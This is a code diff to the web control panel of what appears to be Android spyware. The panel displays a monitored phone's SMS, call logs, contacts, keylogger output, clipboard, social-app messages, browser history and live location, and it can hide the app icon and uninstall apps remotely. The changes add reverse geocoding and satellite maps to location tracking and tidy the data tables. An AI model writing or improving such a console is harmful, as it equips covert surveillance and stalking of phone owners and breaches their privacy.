@@ -12,7 +12,7 @@
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth-compat.js"></script>
     <style>
-        /* ========== All existing styles (keep unchanged) ========== */
+        /* ========== All existing styles (unchanged) ========== */
         :root {
             --primary: #0f62fe;
             --primary-hover: #0353e9;
@@ -139,7 +139,7 @@
         .file-action-btn.dl:hover { color: var(--primary); border-color: var(--primary); }
         .file-action-btn.del:hover { color: var(--danger); border-color: var(--danger); }
         #map, #historyMap { border-radius: var(--radius-md); box-shadow: var(--shadow-sm); border: 1px solid var(--border); }
-        .map-info { position: absolute; top: 20px; left: 20px; background: rgba(255,255,255,0.95); backdrop-filter: blur(8px); padding: 12px 16px; border-radius: var(--radius-sm); font-size: 13px; font-weight: 500; border-left: 4px solid var(--primary); z-index: 1000; box-shadow: var(--shadow-md); }
+        .map-info { position: absolute; top: 20px; left: 20px; background: rgba(255,255,255,0.95); backdrop-filter: blur(8px); padding: 12px 16px; border-radius: var(--radius-sm); font-size: 13px; font-weight: 500; border-left: 4px solid var(--primary); z-index: 1000; box-shadow: var(--shadow-md); max-width: 280px; }
         .current-location-marker { background: #0f62fe; border-radius: 50%; width: 14px; height: 14px; border: 2px solid white; box-shadow: 0 0 0 4px rgba(15,98,254,0.3); }
         .btn-ui { padding: 8px 16px; font-size: 14px; font-weight: 500; border-radius: var(--radius-sm); cursor: pointer; transition: 0.2s; border: none; display: inline-flex; align-items: center; gap: 6px; }
         .btn-ui.primary { background: var(--primary); color: white; }
@@ -176,7 +176,6 @@
         .geofence-controls button { padding: 10px 20px; color: white; border: none; border-radius: var(--radius-sm); cursor: pointer; width: auto; font-weight: 500; transition: 0.2s; }
         #alertsBadge { background: var(--danger-bg); border: 1px solid #fca5a5; border-radius: var(--radius-sm); padding: 16px; margin-top: 16px; }
         .ws-debug { font-size: 11px; color: #94a3b8; margin-top: auto; padding-top: 20px; text-align: center; }
-        /* Call recording card style */
         .call-recording-card {
             background: white;
             border: 1px solid var(--border);
@@ -200,60 +199,23 @@
         .call-recording-details { font-size: 12px; color: var(--text-sec); margin-top: 4px; }
         .download-recording-btn { background: var(--primary); color: white; border: none; padding: 8px 16px; border-radius: var(--radius-sm); cursor: pointer; font-weight: 500; transition: 0.2s; }
         .download-recording-btn:hover { background: var(--primary-hover); transform: scale(1.02); }
-        /* Photo gallery grid */
-        .photo-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
-            gap: 12px;
-            margin-top: 16px;
-        }
-        .photo-tile {
-            position: relative;
-            cursor: pointer;
-            border-radius: 12px;
-            overflow: hidden;
-            background: #f0f0f0;
-            aspect-ratio: 1;
-            transition: transform 0.2s;
-        }
-        .photo-tile:hover {
-            transform: scale(1.02);
-        }
-        .photo-tile img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        .photo-overlay {
+        /* Map type toggle button */
+        .map-type-toggle {
             position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: rgba(0,0,0,0.6);
-            color: white;
-            font-size: 10px;
-            padding: 4px 6px;
-            text-align: center;
+            bottom: 20px;
+            right: 20px;
+            z-index: 1000;
+            background: white;
+            padding: 8px 12px;
+            border-radius: var(--radius-sm);
+            box-shadow: var(--shadow-sm);
+            cursor: pointer;
+            font-size: 12px;
+            font-weight: 500;
+            border: 1px solid var(--border);
         }
-        .fullscreen-modal {
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.95);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 30000;
-            flex-direction: column;
-        }
-        .fullscreen-modal img {
-            max-width: 90vw;
-            max-height: 80vh;
-            object-fit: contain;
-        }
-        .modal-buttons {
-            margin-top: 20px;
-            display: flex;
-            gap: 16px;
+        .map-type-toggle:hover {
+            background: #f0f4f8;
         }
         @media (max-width: 768px) {
             #sidebar { position: fixed; top: 0; left: 0; bottom: 0; transform: translateX(-100%); z-index: 1000; box-shadow: var(--shadow-lg); width: 280px; }
@@ -345,6 +307,7 @@ let screenMediaRecorder = null, screenRecordedChunks = [];
 let currentCameraStream = null, currentAudioStream = null;
 let socialMsgsData = [], currentLocation = null;
 let deviceInfoRefreshInterval = null;
+let currentMapType = 'street'; // 'street' or 'satellite'
 
 const panel = document.getElementById('main-panel');
 const statusEl = document.getElementById('status');
@@ -919,70 +882,209 @@ function showFullPhoto(imageUrl, photoId, storagePath) {
     modal.addEventListener('click', (e) => { if(e.target === modal) modal.remove(); });
 }
 
-// ==================== OTHER DISPLAY FUNCTIONS (unchanged) ====================
-function renderTable(rows,headers){
-    const pageSize=20,total=Math.ceil(rows.length/pageSize),start=currentPage*pageSize;
-    let html='<div style="overflow-x:auto;"></table><thead><tr>'+headers.map(h=>`<th>${h}</th>`).join('')+'</thead><tbody>';
-    rows.slice(start,start+pageSize).forEach(r=>{ html+='<tr>'+r.map(c=>`<td>${escapeHtml(c||'')}</td>`).join('')+'</tr>'; });
-    html+='</tbody></table></div>';
-    if(total>1){ html+='<div class="pagination">'; for(let i=0;i<total;i++) html+=`<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`; html+='</div>'; }
-    panel.innerHTML=html;
+// ==================== ENHANCED MAP WITH REVERSE GEOCODING & MAP TYPE TOGGLE ====================
+function renderMap(loc){
+    let l=typeof loc==='string'?JSON.parse(loc):loc;
+    const lat=l.lat||l.latitude, lon=l.lon||l.longitude, acc=l.accuracy||10;
+    currentLocation={lat,lon,acc};
+    
+    // Build map container with a toggle button
+    panel.innerHTML = `
+        <div style="position:relative;">
+            <div id="map" style="height:400px; border-radius:12px;"></div>
+            <div class="map-info" id="mapInfo">
+                <div><strong>📍 Location</strong></div>
+                <div id="coordDisplay">${lat.toFixed(6)}, ${lon.toFixed(6)}</div>
+                <div id="accuracyDisplay">🎯 Accuracy: ${acc.toFixed(1)} m</div>
+                <div id="addressDisplay">🌍 Loading address...</div>
+            </div>
+            <div class="map-type-toggle" id="mapTypeToggle">🗺️ Switch to Satellite</div>
+        </div>
+    `;
+    
+    if(mapInstance) mapInstance.remove();
+    
+    // Define tile layers
+    const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '&copy; OpenStreetMap contributors'
+    });
+    const satelliteLayer = L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+        attribution: 'Tiles &copy; Esri &mdash; Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye, Getmapping, Aerogrid, IGN, IGP, UPR-EGP, and the GIS User Community'
+    });
+    
+    // Start with street layer
+    mapInstance = L.map('map').setView([lat, lon], 18);
+    streetLayer.addTo(mapInstance);
+    
+    // Add circle and marker
+    L.circle([lat, lon], {radius: acc, color: '#1976ff', fillColor: '#1976ff', fillOpacity: 0.2}).addTo(mapInstance);
+    L.marker([lat, lon], {icon: L.divIcon({className:'current-location-marker', iconSize:[12,12]})}).addTo(mapInstance).bindPopup('Device Location');
+    
+    // Reverse geocoding
+    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`, {
+        headers: { 'User-Agent': 'SystemSync-Console/1.0' }
+    })
+    .then(response => response.json())
+    .then(data => {
+        const address = data.display_name || 'Address not found';
+        document.getElementById('addressDisplay').innerHTML = `🌍 ${escapeHtml(address)}`;
+    })
+    .catch(err => {
+        console.error('Geocoding error:', err);
+        document.getElementById('addressDisplay').innerHTML = '🌍 Address unavailable';
+    });
+    
+    // Map type toggle
+    const toggleBtn = document.getElementById('mapTypeToggle');
+    toggleBtn.addEventListener('click', () => {
+        if(currentMapType === 'street') {
+            mapInstance.removeLayer(streetLayer);
+            satelliteLayer.addTo(mapInstance);
+            currentMapType = 'satellite';
+            toggleBtn.innerHTML = '🗺️ Switch to Street';
+        } else {
+            mapInstance.removeLayer(satelliteLayer);
+            streetLayer.addTo(mapInstance);
+            currentMapType = 'street';
+            toggleBtn.innerHTML = '🗺️ Switch to Satellite';
+        }
+    });
 }
-window.gotoPage=function(p){ currentPage=p; renderTable(); };
-function displaySMS(data){
-    if(!Array.isArray(data)){ panel.innerHTML='<p>No SMS data</p>'; return; }
-    const rows=data.map(m=>[m.type==='inbox'||m.type===1?'📥 Incoming':'📤 Outgoing', m.address||m.number||'', m.body||'', m.date||m.timeFmt||'']);
-    currentData=data; dataType='sms'; renderTable(rows,['Type','Number','Message','Date']);
+
+// ==================== DATA DISPLAY FUNCTIONS (TABULAR WITH PAGINATION) ====================
+function renderTable(rows, headers) {
+    const pageSize = 20;
+    const totalPages = Math.ceil(rows.length / pageSize);
+    const start = currentPage * pageSize;
+    const pageRows = rows.slice(start, start + pageSize);
+    
+    let html = '<div style="overflow-x:auto;"><table><thead><tr>';
+    headers.forEach(h => html += `<th>${h}</th>`);
+    html += '</thead><tbody>';
+    pageRows.forEach(r => {
+        html += '<tr>';
+        r.forEach(cell => html += `<td>${escapeHtml(cell || '')}</td>`);
+        html += '</tr>';
+    });
+    html += '</tbody></table></div>';
+    
+    if (totalPages > 1) {
+        html += '<div class="pagination">';
+        for (let i = 0; i < totalPages; i++) {
+            html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
+        }
+        html += '</div>';
+    }
+    panel.innerHTML = html;
 }
-function displayContacts(data){
-    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>👥 Contacts</h3><p>No contacts found.</p>'; return; }
-    panel.innerHTML=`<h3>👥 Contacts (${data.length})</h3><div style="overflow-x:auto;"><tr><thead><tr><th>Name</th><th>Number</th><th>Times Contacted</th></tr></thead><tbody>${data.map(c=>`<tr><td>${escapeHtml(c.name||'')}</td><td>${escapeHtml(c.number||'')}</td><td>${c.timesContacted||0}</td></tr>`).join('')}</tbody></table></div>`;
+
+window.gotoPage = function(p) {
+    currentPage = p;
+    if (dataType === 'sms') renderTable(currentData, ['Type', 'Number', 'Message', 'Date']);
+    else if (dataType === 'call') renderTable(currentData, ['Type', 'Number', 'Name', 'Date', 'Duration']);
+    else if (dataType === 'contacts') renderTable(currentData, ['Name', 'Number', 'Times Contacted']);
+    else if (dataType === 'wifi') renderTable(currentData, ['SSID', 'Signal', 'Status']);
+};
+
+function displaySMS(data) {
+    if (!Array.isArray(data) || data.length === 0) {
+        panel.innerHTML = '<h3>💬 SMS Messages</h3><p>No messages found.</p>';
+        return;
+    }
+    const rows = data.map(m => [
+        m.type === 'inbox' || m.type === 1 ? '📥 Incoming' : '📤 Outgoing',
+        m.address || m.number || '',
+        m.body || '',
+        m.date || m.timeFmt || ''
+    ]);
+    currentData = rows;
+    dataType = 'sms';
+    renderTable(rows, ['Type', 'Number', 'Message', 'Date']);
 }
+
+function displayCallLogs(data) {
+    if (!Array.isArray(data) || data.length === 0) {
+        panel.innerHTML = '<h3>📞 Call Logs</h3><p>No call logs found.</p>';
+        return;
+    }
+    const rows = data.map(c => [
+        c.type || '',
+        c.number || '',
+        c.name || '',
+        c.date || c.timeFmt || '',
+        c.duration ? c.duration + 's' : ''
+    ]);
+    currentData = rows;
+    dataType = 'call';
+    renderTable(rows, ['Type', 'Number', 'Name', 'Date', 'Duration']);
+}
+
+function displayContacts(data) {
+    if (!Array.isArray(data) || data.length === 0) {
+        panel.innerHTML = '<h3>👥 Contacts</h3><p>No contacts found.</p>';
+        return;
+    }
+    const rows = data.map(c => [
+        c.name || '',
+        c.number || '',
+        c.timesContacted || 0
+    ]);
+    currentData = rows;
+    dataType = 'contacts';
+    renderTable(rows, ['Name', 'Number', 'Times Contacted']);
+}
+
+function displayWifiNetworks(data) {
+    if (!Array.isArray(data) || data.length === 0) {
+        panel.innerHTML = '<h3>📶 Wi-Fi Networks</h3><p>No networks found.</p>';
+        return;
+    }
+    const rows = data.map(n => {
+        const bars = n.rssi > -50 ? '████' : (n.rssi > -70 ? '███░' : (n.rssi > -80 ? '██░░' : '█░░░'));
+        const status = n.connected ? '● Connected' : '○';
+        return [n.ssid || '(hidden)', bars, status];
+    });
+    currentData = rows;
+    dataType = 'wifi';
+    renderTable(rows, ['SSID', 'Signal', 'Status']);
+}
+
 function displayInstalledApps(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📱 Installed Apps</h3><p>No apps found.</p>'; return; }
     panel.innerHTML=`<h3>📱 Installed Apps (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>App</th><th>Package</th><th>Actions</th></tr></thead><tbody>${data.map(app=>`<tr><td>${escapeHtml(app.appName||'')}</td><td style="font-size:11px;color:#999;">${escapeHtml(app.packageName||'')}</td><td><button class="open-app" data-pkg="${escapeHtml(app.packageName)}">Open</button> <button class="remove-app" data-pkg="${escapeHtml(app.packageName)}">Remove</button></td></tr>`).join('')}</tbody></table></div>`;
     document.querySelectorAll('.open-app').forEach(btn=>btn.onclick=()=>sendCommand('OPEN_APP',{package:btn.dataset.pkg}));
     document.querySelectorAll('.remove-app').forEach(btn=>btn.onclick=()=>sendCommand('UNINSTALL_APP',{package:btn.dataset.pkg}));
 }
+
 function displayBrowserHistory(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>🌐 Browser History</h3><p>No history found.</p>'; return; }
-    panel.innerHTML=`<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"></td><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<h3>🌐 Browser History (${data.length})</h3><div style="overflow-x:auto;"><table><thead><tr><th>Date</th><th>Title</th><th>URL</th></tr></thead><tbody>${data.map(item=>`<tr><td>${item.date||item.timeFmt||''}</td><td>${escapeHtml(item.title||'')}</td><td><a href="${escapeHtml(item.url||'#')}" target="_blank">${escapeHtml(item.url||'')}</a></td></tr>`).join('')}</tbody></table></div>`;
 }
-function displayWifiNetworks(data){
-    if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📶 Wi-Fi Networks</h3><p>No networks found.</p>'; return; }
-    panel.innerHTML=`<h3>📶 Wi-Fi Networks (${data.length})</h3><div style="overflow-x:auto;"></table><thead><tr><th>SSID</th><th>Signal</th><th>Status</th></tr></thead><tbody>${data.map(n=>{ const bars=n.rssi>-50?'████':n.rssi>-70?'███░':n.rssi>-80?'██░░':'█░░░'; return `<tr style="${n.connected?'background:#f0fff4':''}"><td>${escapeHtml(n.ssid||'(hidden)')}</td><td>${bars}</td><td>${n.connected?'● Connected':'○'}</td></tr>`; }).join('')}</tbody></table></div>`;
-}
+
 function displayAppUsage(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>📊 Screen Time</h3><p>No data. Enable Usage Access in device Settings.</p>'; return; }
     const max=Math.max(...data.map(a=>a.totalTimeMs||0));
     panel.innerHTML=`<h3>📊 Screen Time (${data.length} apps)</h3><div style="margin-top:16px;">${data.map(app=>{ const t=app.totalTimeMs||0; const pct=max?Math.round(t/max*100):0; const color=getColorForDuration(t); return `<div class="app-usage-item"><div class="app-usage-name">${escapeHtml(app.appName||app.packageName||'Unknown')}</div><div class="usage-bar-container"><div class="usage-bar" style="width:${pct}%; background-color:${color};"></div></div><div class="app-usage-time">${formatDuration(t)}</div></div>`; }).join('')}</div>`;
 }
+
 function displayKeylog(data){
     if(!Array.isArray(data)||!data.length){ panel.innerHTML='<h3>⌨️ Keyboard Log</h3><p>No keystrokes yet.</p>'; return; }
-    panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></tr></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
+    panel.innerHTML=`<div style="display:flex;justify-content:space-between;"><h3>⌨️ Keyboard Log (${data.length})</h3><button id="clearKeylogBtn" style="background:#d32f2f;color:white;border:none;padding:6px 12px;border-radius:6px;">Clear</button></div><div style="overflow-x:auto;"><table><thead><tr><th>Time</th><th>App</th><th>Text</th></table></thead><tbody>${data.slice().reverse().map(e=>`<tr><td>${e.timeFmt||''}</td><td>${(e.pkg||'').split('.').pop()}</td><td>${escapeHtml(e.text||e.key||'')}</td></tr>`).join('')}</tbody></table></div>`;
     document.getElementById('clearKeylogBtn')?.addEventListener('click',()=>sendCommand('CLEAR_KEYLOG'));
 }
+
 function displayClipboard(data){
     const content=data&&data.content?data.content:(data||'');
     panel.innerHTML=`<h3>📋 Clipboard</h3><div style="background:#fff;border:1px solid #e0e4e8;border-radius:8px;padding:16px;"><div>Type: ${data&&data.type?data.type:'text'}</div><div style="font-family:monospace;word-break:break-all;">${escapeHtml(content)}</div></div><p style="margin-top:12px;">Captures copied text from device.</p>`;
 }
+
 function displaySocialMessages(data){
     let msgs=typeof data==='string'?JSON.parse(data):data;
     if(!Array.isArray(msgs)||!msgs.length){ panel.innerHTML='<h3>💬 Social Messages</h3><p>No messages yet. Make sure Notification Access is enabled.</p>'; return; }
     panel.innerHTML=`<h3>💬 Social Messages (${msgs.length})</h3><div style="overflow-y:auto;max-height:60vh;">`+msgs.slice().reverse().map(m=>`<div style="background:#fff;border:1px solid #eee;border-radius:10px;padding:12px;margin-bottom:8px;"><div><strong>${escapeHtml(m.app||getAppNameFromPkg(m.pkg)||'Unknown')}</strong> <small>${m.timeFmt||''}</small></div><div>${escapeHtml(m.title||'')}</div><div>${escapeHtml(m.text||m.body||'')}</div></div>`).join('')+`</div>`;
 }
 function getAppNameFromPkg(pkg){ const map={'com.whatsapp':'WhatsApp','org.telegram.messenger':'Telegram','com.instagram.android':'Instagram','com.facebook.orca':'Messenger','com.facebook.katana':'Facebook','com.snapchat.android':'Snapchat'}; return map[pkg]||pkg; }
-function renderMap(loc){
-    let l=typeof loc==='string'?JSON.parse(loc):loc;
-    const lat=l.lat||l.latitude, lon=l.lon||l.longitude, acc=l.accuracy||10;
-    currentLocation={lat,lon,acc};
-    panel.innerHTML=`<div id="map" style="height:380px;"></div><div class="map-info">📍 Current: ${lat.toFixed(6)}, ${lon.toFixed(6)}<br>🎯 Accuracy: ${acc.toFixed(1)}m</div>`;
-    if(mapInstance)mapInstance.remove();
-    mapInstance=L.map('map').setView([lat,lon],18);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
-    L.circle([lat,lon],{radius:acc,color:'#1976ff',fillColor:'#1976ff',fillOpacity:0.2}).addTo(mapInstance);
-    L.marker([lat,lon],{icon:L.divIcon({className:'current-location-marker',iconSize:[12,12]})}).addTo(mapInstance).bindPopup('Current Device Location');
-}
+
 function showGeofencePanel(){
     if(!currentLocation){
         sendCommand('GET_LOCATION');
@@ -1039,7 +1141,6 @@ function showLocationHistoryPanel() {
     sendCommand('GET_LOCATION_HISTORY',{days:3});
 }
 function displayLocationHistory(data) { /* simplified */ panel.innerHTML = '<p>History loaded (simplified)</p>'; }
-function displayPhotoGallery(data){ /* legacy fallback */ if(data && Array.isArray(data)) showPhotoGalleryPanel(); else showPhotoGalleryPanel(); }
 function showAppEventsPanel(){
     panel.innerHTML='<h3>📦 App & Call Events</h3><p>App installs/removals and call events from device.</p><div><button data-days="1" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">Today</button><button data-days="3" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">3 Days</button><button data-days="5" style="background:#1976ff;color:white;border:none;padding:6px 12px;border-radius:6px;margin:4px;">5 Days</button></div><div id="appEventsList"></div>';
     panel.querySelectorAll('button[data-days]').forEach(btn=>btn.onclick=()=>sendCommand('GET_APP_EVENTS',{days:parseInt(btn.dataset.days)}));
@@ -1071,13 +1172,17 @@ function handleJSON(json){
     if(Array.isArray(json)){
         if(pendingCommand==='LIST_FILES'){ currentData=json; renderFiles(); }
         else if(pendingCommand==='GET_SMS'){ displaySMS(json); }
-        else if(pendingCommand==='GET_CALL_LOGS'){ const rows=json.map(c=>[c.type||'',c.number||'',c.name||'',c.date||c.timeFmt||'',c.duration?c.duration+'s':'']); renderTable(rows,['Type','Number','Name','Date','Duration']); }
+        else if(pendingCommand==='GET_CALL_LOGS'){ displayCallLogs(json); }
+        else if(pendingCommand==='GET_CONTACTS'){ displayContacts(json); }
+        else if(pendingCommand==='GET_WIFI_NETWORKS'){ displayWifiNetworks(json); }
         pendingCommand=null; return;
     }
     switch(json.type){
         case 'FILE_LIST': try{ currentData=typeof json.data==='string'?JSON.parse(json.data):json.data; if(window.pendingFolderLoad) { const { inner } = window.pendingFolderLoad; inner.innerHTML = renderFileTreeNodes(currentData, window.pendingFolderLoad.path); window.pendingFolderLoad = null; attachFileEventListeners(); } else { renderFiles(); } }catch(e){} break;
         case 'SMS_DATA': try{ displaySMS(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
-        case 'CALL_LOGS': try{ const d=typeof json.data==='string'?JSON.parse(json.data):json.data; const rows=d.map(c=>[c.type||'',c.number||'',c.name||'',c.date||c.timeFmt||'',c.duration?c.duration+'s':'']); renderTable(rows,['Type','Number','Name','Date','Duration']); }catch(e){} break;
+        case 'CALL_LOGS': try{ displayCallLogs(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
+        case 'CONTACTS_DATA': try{ displayContacts(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
+        case 'WIFI_NETWORKS_DATA': try{ displayWifiNetworks(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'SOCIAL_MESSAGES_DATA': try{ displaySocialMessages(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'CAMERA_IMAGE': displayCapturedImage(json.data); break;
         case 'LOCATION_UPDATE': renderMap(json.data||json); break;
@@ -1088,11 +1193,9 @@ function handleJSON(json){
         case 'FLASH_OFF': flashOn=false; document.getElementById('flashBtn').innerText='Flash On'; showNotification('🔦 Flashlight OFF'); break;
         case 'APP_HIDDEN': iconHidden=true; document.getElementById('iconBtn').innerText='Show Icon'; showNotification('App icon hidden'); break;
         case 'APP_SHOWN': iconHidden=false; document.getElementById('iconBtn').innerText='Hide Icon'; showNotification('App icon shown'); break;
-        case 'CONTACTS_DATA': try{ displayContacts(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'INSTALLED_APPS': try{ displayInstalledApps(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'APP_USAGE_DATA': try{ displayAppUsage(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'BROWSER_HISTORY_DATA': try{ displayBrowserHistory(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
-        case 'WIFI_NETWORKS_DATA': try{ displayWifiNetworks(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'KEYLOG_DATA': try{ displayKeylog(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'CLIPBOARD_DATA': try{ displayClipboard(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
         case 'RECENT_IMAGES_DATA': try{ displayPhotoGallery(typeof json.data==='string'?JSON.parse(json.data):json.data); }catch(e){} break;
@@ -1123,7 +1226,9 @@ function handlePlainText(msg){
     else if(msg.startsWith("FLASH_OFF")){ flashOn=false; document.getElementById('flashBtn').innerText='Flash On'; showNotification('Flash OFF'); }
     else if(msg.startsWith("LOC_DATA:")) try{ renderMap(JSON.parse(msg.substring(9))); }catch(e){}
     else if(msg.startsWith("SMS_DATA:")) try{ displaySMS(JSON.parse(msg.substring(9))); }catch(e){}
-    else if(msg.startsWith("CALL_DATA:")) try{ const d=JSON.parse(msg.substring(10)); const rows=d.map(c=>[c.type||'',c.number||'',c.name||'',c.date||c.timeFmt||'',c.duration?c.duration+'s':'']); renderTable(rows,['Type','Number','Name','Date','Duration']); }catch(e){}
+    else if(msg.startsWith("CALL_DATA:")) try{ displayCallLogs(JSON.parse(msg.substring(10))); }catch(e){}
+    else if(msg.startsWith("CONTACTS_DATA:")) try{ displayContacts(JSON.parse(msg.substring(14))); }catch(e){}
+    else if(msg.startsWith("WIFI_DATA:")) try{ displayWifiNetworks(JSON.parse(msg.substring(10))); }catch(e){}
     else if(msg.startsWith('[')||msg.startsWith('{')) try{ handleJSON(JSON.parse(msg)); }catch(e){}
 }
 function handleIncomingMessage(msg){
@@ -1146,7 +1251,7 @@ function setupEvents(){
     document.getElementById('contactsBtn').onclick=()=>{ currentPage=0; sendCommand('GET_CONTACTS'); };
     document.getElementById('installedAppsBtn').onclick=()=>{ currentPage=0; sendCommand('GET_INSTALLED_APPS'); };
     document.getElementById('browserHistoryBtn').onclick=()=>sendCommand('GET_BROWSER_HISTORY');
-    document.getElementById('wifiNetworksBtn').onclick=()=>sendCommand('GET_WIFI_NETWORKS');
+    document.getElementById('wifiNetworksBtn').onclick=()=>{ currentPage=0; sendCommand('GET_WIFI_NETWORKS'); };
     document.getElementById('screenTimeBtn').onclick=showAppUsagePanel;
     document.getElementById('socialMessagesBtn').onclick=()=>sendCommand('GET_SOCIAL_MESSAGES',{days:3});
     document.getElementById('keylogBtn').onclick=()=>sendCommand('GET_KEYLOG');
